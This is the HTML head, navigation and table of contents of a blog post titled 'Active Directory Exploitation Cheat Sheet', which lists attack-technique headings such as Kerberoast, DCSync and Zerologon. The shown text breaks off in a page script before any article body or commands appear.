<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>Active Directory Exploitation Cheat Sheet &#183; Classroom</title><meta name=title content="Active Directory Exploitation Cheat Sheet &#183; Classroom"><meta name=description content="Active Directory exploitation cheat sheet covering common attack techniques, enumeration, privilege escalation, and lateral movement in AD environments."><meta name=keywords content="notes,"><link rel=canonical href=https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/><meta name=author content="Animesh Roy"><link href=https://twitter.com/anir0y rel=me><link href=https://github.com/anir0y rel=me><meta property="og:url" content="https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/"><meta property="og:site_name" content="Classroom"><meta property="og:title" content="Active Directory Exploitation Cheat Sheet"><meta property="og:description" content="Active Directory exploitation cheat sheet covering common attack techniques, enumeration, privilege escalation, and lateral movement in AD environments."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-05-07T14:00:36+05:30"><meta property="article:modified_time" content="2021-05-07T14:00:36+05:30"><meta property="article:tag" content="Notes"><meta name=twitter:card content="summary"><meta name=twitter:title content="Active Directory Exploitation Cheat Sheet"><meta name=twitter:description content="Active Directory exploitation cheat sheet covering common attack techniques, enumeration, privilege escalation, and lateral movement in AD environments."><meta name=twitter:image content="https://classroom.anir0y.in/img/cover.jpg"><meta property="og:image" content="https://classroom.anir0y.in/img/cover.jpg"><link type=text/css rel=stylesheet href=/css/main.bundle.min.2b25fd51aafe5a0a65545bce9bd61a30f10d3e06d3ee7763f9340e7b14b436599753c7638c95d4d05f1c440e6fd97fc28f2f1a2f19130b30f65434ddd920ebe3.css integrity="sha512-KyX9Uar+WgplVFvOm9YaMPENPgbT7ndj+TQOexS0NlmXU8djjJXU0F8cRA5v2X/Cjy8aLxkTCzD2VDTd2SDr4w=="><script type=text/javascript src=/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js integrity="sha512-b0EXSzoFtoCCD+CMrb+l+3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script><script src=/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js integrity="sha512-vdp97ObLrwje730lT3+ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w==" data-copy=Copy data-copied=Copied></script><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"Active Directory Exploitation Cheat Sheet","headline":"Active Directory Exploitation Cheat Sheet","description":"Active Directory exploitation cheat sheet covering common attack techniques, enumeration, privilege escalation, and lateral movement in AD environments.","inLanguage":"en","url":"https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/","author":{"@type":"Person","name":"Animesh Roy","url":"https:\/\/classroom.anir0y.in\/about/me/"},"publisher":{"@type":"Organization","name":"Classroom","logo":{"@type":"ImageObject","url":"https:\/\/classroom.anir0y.in\/img/avatar.jpeg"}},"image":"https:\/\/classroom.anir0y.in\/img\/blog.png","copyrightYear":"2021","dateCreated":"2021-05-07T14:00:36\u002b05:30","datePublished":"2021-05-07T14:00:36\u002b05:30","dateModified":"2021-05-07T14:00:36\u002b05:30","keywords":["notes"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/"},"wordCount":"4418"},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://classroom.anir0y.in/post/"},{"@type":"ListItem","position":2,"name":"Active Directory Exploitation Cheat Sheet","item":"https://classroom.anir0y.in/post/active-directory-exploitation-cheat-sheet/"}]}]</script><script>(function(){var e=!1;function t(){if(e)return;e=!0;var n=document.createElement("script");n.src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3526678290068011",n.async=!0,n.crossOrigin="anonymous",document.head.appendChild(n),["scroll","click","touchstart"].forEach(function(e){window.removeEventListener(e,t,{capture:!0,passive:!0})})}["scroll","click","touchstart"].forEach(function(e){window.addEventListener(e,t,{capture:!0,passive:!0,once:!0})})})()</script></head><body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
Skip to main content</a></div><div class="main-menu flex items-center w-full gap-2 p-1 pl-0"><a href=/ class="text-base font-medium truncate min-w-0 shrink">Classroom</a><div class="flex items-center ms-auto"><div class="hidden md:flex"><nav class="flex items-center gap-x-5 h-12"><a href=/post/ class="flex items-center bf-icon-color-hover" aria-label=Posts title=Posts><span class="text-base font-medium break-normal">Posts
</span></a><a href=/categories/ class="flex items-center bf-icon-color-hover" aria-label=Categories title=Categories><span class="text-base font-medium break-normal">Categories
</span></a><a href=/tags/ class="flex items-center bf-icon-color-hover" aria-label=Tags title=Tags><span class="text-base font-medium break-normal">Tags
</span></a><a href=/archives/ class="flex items-center bf-icon-color-hover" aria-label=Archives title=Archives><span class="text-base font-medium break-normal">Archives
</span></a><a href=/about/me/ class="flex items-center bf-icon-color-hover" aria-label=About title><span class="text-base font-medium break-normal">About
</span></a><button id=search-button aria-label=Search class="text-base bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base bf-icon-color-hover"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav></div><div class="flex md:hidden"><div class="flex items-center h-14 gap-4"><button id=search-button-mobile aria-label=Search class="flex items-center justify-center bf-icon-color-hover" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile type=button aria-label="Dark mode switcher" class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400"><div class=dark:hidden><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="hidden dark:block"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button>
<input type=checkbox id=mobile-menu-toggle autocomplete=off class="hidden peer">
<label for=mobile-menu-toggle class="flex items-center justify-center cursor-pointer bf-icon-color-hover"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></label><div role=dialog aria-modal=true style=scrollbar-gutter:stable class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
bf-scrollbar"><label for=mobile-menu-toggle class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></label><nav class="mx-auto max-w-md space-y-6"><div class=px-2><a href=/post/ aria-label=Posts class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Posts class="text-2xl font-bold tracking-tight">Posts</span></a></div><div class=px-2><a href=/categories/ aria-label=Categories class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Categories class="text-2xl font-bold tracking-tight">Categories</span></a></div><div class=px-2><a href=/tags/ aria-label=Tags class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Tags class="text-2xl font-bold tracking-tight">Tags</span></a></div><div class=px-2><a href=/archives/ aria-label=Archives class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title=Archives class="text-2xl font-bold tracking-tight">Archives</span></a></div><div class=px-2><a href=/about/me/ aria-label=About class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200"><span title class="text-2xl font-bold tracking-tight">About</span></a></div></nav></div></div></div></div></div><script>(function(){var t,n,e=document.querySelector(".main-menu");if(!e)return;t=window.location.pathname,n=e.querySelectorAll('a[href="'+t+'"]'),n.forEach(function(e){var t=e.querySelectorAll("span");t.forEach(function(e){e.classList.add("active")})})})()</script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"><img id=background-image src=/img/blog_hu_190fc48a0b7cfb22.png role=presentation loading=eager decoding=async fetchpriority=high class="absolute inset-0 w-full h-full object-cover"><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div><script type=text/javascript src=/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W+5DcKnbOMMOI+f7IvMGNsVvUfj+ooJ13n6EqqcGEz2FKMVvHLGwWPQ==" data-blur-id=background-blur data-image-id=background-image data-image-url=/img/blog_hu_190fc48a0b7cfb22.png></script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Classroom</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/post/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/post/active-directory-exploitation-cheat-sheet/>Active Directory Exploitation Cheat Sheet</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Active Directory Exploitation Cheat Sheet</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-05-07T14:00:36+05:30>7 May 2021</time><span class="px-2 text-primary-500">&#183;</span><span>4418 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">21 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes</span></span></a></div></div><div class="flex author"><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Animesh Roy</div><div class="text-sm text-neutral-700 dark:text-neutral-400">CTF walkthroughs, malware analysis, penetration testing, and security research.</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://twitter.com/anir0y target=_blank aria-label=Twitter title=Twitter rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645.0 138.72-105.583 298.558-298.558 298.558-59.452.0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055.0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421.0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391.0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04.0-57.828 46.782-104.934 104.934-104.934 30.213.0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/anir0y target=_blank aria-label=Github title=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></div></div></div></div><div class=mb-5></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs"><div class="toc ps-5 print:hidden lg:sticky lg:top-10"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#summary>Summary</a></li><li><a href=#tools>Tools</a></li><li><a href=#domain-enumeration>Domain Enumeration</a><ul><li><a href=#using-powerview>Using PowerView</a></li><li><a href=#using-ad-module>Using AD Module</a></li><li><a href=#using-bloodhound>Using BloodHound</a></li><li><a href=#useful-enumeration-tools>Useful Enumeration Tools</a></li></ul></li><li><a href=#local-privilege-escalation>Local Privilege Escalation</a><ul><li><a href=#useful-local-priv-esc-tools>Useful Local Priv Esc Tools</a></li></ul></li><li><a href=#lateral-movement>Lateral Movement</a><ul><li><a href=#powershell-remoting>Powershell Remoting</a></li><li><a href=#remote-code-execution-with-ps-credentials>Remote Code Execution with PS Credentials</a></li><li><a href=#import-a-powershell-module-and-execute-its-functions-remotely>Import a powershell module and execute its functions remotely</a></li><li><a href=#executing-remote-stateful-commands>Executing Remote Stateful commands</a></li><li><a href=#mimikatz>Mimikatz</a></li><li><a href=#useful-tools>Useful Tools</a></li></ul></li><li><a href=#domain-privilege-escalation>Domain Privilege Escalation</a><ul><li><a href=#kerberoast>Kerberoast</a></li><li><a href=#asreproast>ASREPRoast</a></li><li><a href=#password-spray-attack>Password Spray Attack</a></li><li><a href=#force-set-spn>Force Set SPN</a></li><li><a href=#abusing-shadow-copies>Abusing Shadow Copies</a></li><li><a href=#list-and-decrypt-stored-credentials-using-mimikatz>List and Decrypt Stored Credentials using Mimikatz</a></li><li><a href=#unconstrained-delegation>Unconstrained Delegation</a></li><li><a href=#constrained-delegation>Constrained Delegation</a></li><li><a href=#resource-based-constrained-delegation>Resource Based Constrained Delegation</a></li><li><a href=#dnsadmins-abuse>DNSAdmins Abuse</a></li><li><a href=#abusing-active-directory-integraded-dns>Abusing Active Directory-Integraded DNS</a></li><li><a href=#abusing-backup-operators-group>Abusing Backup Operators Group</a></li><li><a href=#abusing-exchange>Abusing Exchange</a></li><li><a href=#weaponizing-printer-bug>Weaponizing Printer Bug</a></li><li><a href=#abusing-acls>Abusing ACLs</a></li><li><a href=#abusing-ipv6-with-mitm6>Abusing IPv6 with mitm6</a></li><li><a href=#sid-history-abuse>SID History Abuse</a></li><li><a href=#exploiting-sharepoint>Exploiting SharePoint</a></li><li><a href=#zerologon-exploit>Zerologon Exploit</a></li></ul></li><li><a href=#domain-persistence>Domain Persistence</a><ul><li><a href=#golden-ticket-attack>Golden Ticket Attack</a></li><li><a href=#dcsync-attack>DCsync Attack</a></li><li><a href=#silver-ticket-attack>Silver Ticket Attack</a></li><li><a href=#skeleton-key-attack>Skeleton Key Attack</a></li><li><a href=#dsrm-abuse>DSRM Abuse</a></li><li><a href=#custom-ssp>Custom SSP</a></li></ul></li><li><a href=#cross-forest-attacks>Cross Forest Attacks</a><ul><li><a href=#trust-tickets>Trust Tickets</a></li><li><a href=#abuse-mssql-servers>Abuse MSSQL Servers</a></li><li><a href=#breaking-forest-trusts>Breaking Forest Trusts</a></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#summary>Summary</a></li><li><a href=#tools>Tools</a></li><li><a href=#domain-enumeration>Domain Enumeration</a><ul><li><a href=#using-powerview>Using PowerView</a></li><li><a href=#using-ad-module>Using AD Module</a></li><li><a href=#using-bloodhound>Using BloodHound</a></li><li><a href=#useful-enumeration-tools>Useful Enumeration Tools</a></li></ul></li><li><a href=#local-privilege-escalation>Local Privilege Escalation</a><ul><li><a href=#useful-local-priv-esc-tools>Useful Local Priv Esc Tools</a></li></ul></li><li><a href=#lateral-movement>Lateral Movement</a><ul><li><a href=#powershell-remoting>Powershell Remoting</a></li><li><a href=#remote-code-execution-with-ps-credentials>Remote Code Execution with PS Credentials</a></li><li><a href=#import-a-powershell-module-and-execute-its-functions-remotely>Import a powershell module and execute its functions remotely</a></li><li><a href=#executing-remote-stateful-commands>Executing Remote Stateful commands</a></li><li><a href=#mimikatz>Mimikatz</a></li><li><a href=#useful-tools>Useful Tools</a></li></ul></li><li><a href=#domain-privilege-escalation>Domain Privilege Escalation</a><ul><li><a href=#kerberoast>Kerberoast</a></li><li><a href=#asreproast>ASREPRoast</a></li><li><a href=#password-spray-attack>Password Spray Attack</a></li><li><a href=#force-set-spn>Force Set SPN</a></li><li><a href=#abusing-shadow-copies>Abusing Shadow Copies</a></li><li><a href=#list-and-decrypt-stored-credentials-using-mimikatz>List and Decrypt Stored Credentials using Mimikatz</a></li><li><a href=#unconstrained-delegation>Unconstrained Delegation</a></li><li><a href=#constrained-delegation>Constrained Delegation</a></li><li><a href=#resource-based-constrained-delegation>Resource Based Constrained Delegation</a></li><li><a href=#dnsadmins-abuse>DNSAdmins Abuse</a></li><li><a href=#abusing-active-directory-integraded-dns>Abusing Active Directory-Integraded DNS</a></li><li><a href=#abusing-backup-operators-group>Abusing Backup Operators Group</a></li><li><a href=#abusing-exchange>Abusing Exchange</a></li><li><a href=#weaponizing-printer-bug>Weaponizing Printer Bug</a></li><li><a href=#abusing-acls>Abusing ACLs</a></li><li><a href=#abusing-ipv6-with-mitm6>Abusing IPv6 with mitm6</a></li><li><a href=#sid-history-abuse>SID History Abuse</a></li><li><a href=#exploiting-sharepoint>Exploiting SharePoint</a></li><li><a href=#zerologon-exploit>Zerologon Exploit</a></li></ul></li><li><a href=#domain-persistence>Domain Persistence</a><ul><li><a href=#golden-ticket-attack>Golden Ticket Attack</a></li><li><a href=#dcsync-attack>DCsync Attack</a></li><li><a href=#silver-ticket-attack>Silver Ticket Attack</a></li><li><a href=#skeleton-key-attack>Skeleton Key Attack</a></li><li><a href=#dsrm-abuse>DSRM Abuse</a></li><li><a href=#custom-ssp>Custom SSP</a></li></ul></li><li><a href=#cross-forest-attacks>Cross Forest Attacks</a><ul><li><a href=#trust-tickets>Trust Tickets</a></li><li><a href=#abuse-mssql-servers>Abuse MSSQL Servers</a></li><li><a href=#breaking-forest-trusts>Breaking Forest Trusts</a></li></ul></li></ul></nav></div></details><script>(function(){"use strict";const s=.33,o="#TableOfContents",i=".anchor",a='a[href^="#"]',r="li ul",c="active";let t=!1;function l(e,n){const o=window.scrollY+window.innerHeight*n,i=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],s=new Set(i.map(e=>e.getAttribute("href").substring(1)));if(t)for(let t=0;t<e.length;t++){const n=e[t];if(!s.has(n.id))continue;const o=n.getBoundingClientRect().top+window.scrollY;if(Math.abs(window.scrollY-o)<100)return n.id}for(let t=e.length-1;t>=0;t--){const n=e[t].getBoundingClientRect().top+window.scrollY;if(n<=o&&s.has(e[t].id))return e[t].id}return e.find(e=>s.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=l(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(c,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let 